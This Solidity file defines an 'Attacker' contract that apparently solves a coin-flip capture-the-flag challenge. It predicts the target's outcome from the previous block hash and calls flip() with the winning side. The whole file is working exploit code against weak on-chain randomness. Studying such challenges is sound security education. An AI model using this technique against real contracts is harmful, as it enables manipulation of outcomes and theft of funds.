// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./CoinFlip.sol";


contract Attacker {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlipContract = CoinFlip(0xF70d6224b7A8b95F8627F4B4D902D519f996eed2);


    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
        
    }
}